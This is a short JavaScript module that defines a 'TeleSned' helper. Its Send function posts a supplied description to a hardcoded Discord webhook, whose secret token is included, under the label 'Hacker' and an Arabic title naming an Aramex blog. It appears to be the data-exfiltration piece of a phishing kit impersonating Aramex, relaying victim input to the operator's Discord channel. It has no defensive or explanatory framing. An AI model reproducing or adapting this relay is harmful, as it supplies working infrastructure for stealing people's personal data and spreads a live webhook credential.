import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323703084005720176/Zx82HN61hGxYEl54irHBOfBWQR1lpxv5pCuZc26bAl1Ni0J6hZRvZHGMBdZwHX2YlcnE",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
